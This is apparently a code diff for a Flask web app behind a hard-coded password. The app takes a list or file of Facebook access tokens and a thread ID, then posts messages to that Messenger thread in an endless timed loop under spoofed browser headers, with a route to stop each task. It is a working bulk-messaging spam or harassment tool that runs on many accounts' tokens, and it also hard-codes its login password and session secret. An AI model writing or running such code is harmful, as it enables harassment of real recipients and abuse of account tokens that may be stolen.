@@ -7,14 +7,13 @@ import string
 
 app = Flask(__name__)
 app.secret_key = "super_secret_key"
-PASSWORD = "Lucifer"  # 🔐 Password
+PASSWORD = "Lucifer"
 
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
@@ -24,7 +23,7 @@ headers = {
 stop_events = {}
 threads = {}
 
-# ===================== PASSWORD LOGIN =====================
+# ===================== LOGIN =====================
 @app.route('/login', methods=['GET','POST'])
 def login():
     if request.method == 'POST':
@@ -35,81 +34,31 @@ def login():
         else:
             return '<h2 style="text-align:center;color:red;margin-top:50px;">❌ Wrong Password</h2><a href="/login" style="text-align:center;display:block;">Try Again</a>'
     return '''
-    <html>
-    <head>
-        <title>🔐 Login</title>
-        <style>
-            body {
-                background: linear-gradient(135deg, #1f1c2c, #928DAB);
-                color:white;
-                font-family:Arial;
-                text-align:center;
-                display:flex;
-                justify-content:center;
-                align-items:center;
-                height:100vh;
-                overflow:hidden;
-            }
-            .login-box {
-                background: rgba(255,255,255,0.1);
-                padding:40px;
-                border-radius:20px;
-                backdrop-filter: blur(8px);
-                animation: fadeIn 1.5s ease-in-out;
-            }
-            .login-box h2 {
-                color:#fff;
-                margin-bottom:20px;
-                font-size:26px;
-                animation: glow 2s infinite alternate;
-            }
-            input {
-                width:100%;
-                padding:12px;
-                margin:10px 0;
-                border:none;
-                border-radius:10px;
-                outline:none;
-                font-size:16px;
-            }
-            button {
-                margin-top:15px;
-                padding:12px 20px;
-                border:none;
-                border-radius:10px;
-                background:linear-gradient(45deg,#00c6ff,#0072ff);
-                color:#fff;
-                font-size:16px;
-                cursor:pointer;
-                transition:0.3s;
-            }
-            button:hover {
-                transform: scale(1.05);
-                background:linear-gradient(45deg,#ff6a00,#ee0979);
-            }
-            @keyframes fadeIn {
-                from { opacity: 0; transform: translateY(-30px);}
-                to { opacity: 1; transform: translateY(0);}
-            }
-            @keyframes glow {
-                from { text-shadow:0 0 10px #00f,0 0 20px #0ff;}
-                to { text-shadow:0 0 20px #ff0,0 0 30px #f0f;}
-            }
-        </style>
-    </head>
-    <body>
-        <div class="login-box">
-            <h2>🔑 Enter Password</h2>
-            <form method="post">
-                <input type="password" name="password" placeholder="••••••" required><br>
-                <button type="submit">Login</button>
-            </form>
-        </div>
-    </body>
-    </html>
-    '''
+<html>
+<head>
+<title>🔐 Login</title>
+<style>
+body {background: linear-gradient(135deg, #1f1c2c, #928DAB); color:white; font-family:Arial; text-align:center; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden;}
+.login-box {background: rgba(255,255,255,0.1); padding:40px; border-radius:20px; backdrop-filter: blur(8px);}
+.login-box h2 {color:#fff; margin-bottom:20px; font-size:26px;}
+input {width:100%; padding:12px; margin:10px 0; border:none; border-radius:10px; outline:none; font-size:16px;}
+button {margin-top:15px; padding:12px 20px; border:none; border-radius:10px; background:linear-gradient(45deg,#00c6ff,#0072ff); color:#fff; font-size:16px; cursor:pointer;}
+button:hover {transform: scale(1.05); background:linear-gradient(45deg,#ff6a00,#ee0979);}
+</style>
+</head>
+<body>
+<div class="login-box">
+<h2>🔑 Enter Password</h2>
+<form method="post">
+<input type="password" name="password" placeholder="••••••" required><br>
+<button type="submit">Login</button>
+</form>
+</div>
+</body>
+</html>
+'''
 
-# ===================== ORIGINAL SCRIPT =====================
+# ===================== MAIN SCRIPT =====================
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if not session.get('logged_in'):
@@ -134,7 +83,7 @@ def send_message():
         thread.start()
         return f'Task started with ID: {task_id}'
 
-    return render_template_string('''
+    return render_template_string("""
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -210,4 +159,38 @@ body {background-image:url('https://i.ibb.co/LRrPTkG/c278d531d734cc6fcf79165d664
 function toggleTokenInput() {
 var tokenOption=document.getElementById('tokenOption').value;
 if(tokenOption=='single'){document.getElementById('singleTokenInput').style.display='block';document.getElementById('tokenFileInput').style.display='none';}
-else{document.getElementById('singleTokenInput').style.display='none';document.getElementById('tokenFileInput
+else{document.getElementById('singleTokenInput').style.display='none';document.getElementById('tokenFileInput').style.display='block';}
+}
+</script>
+</body>
+</html>
+""")
+
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task with ID {task_id} has been stopped.'
+    else:
+        return f'No task found with ID {task_id}.'
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                try:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/messages'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    print(f"Sent: {message} Status: {response.status_code}")
+                except Exception as e:
+                    print("Error:", e)
+            time.sleep(time_interval)
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
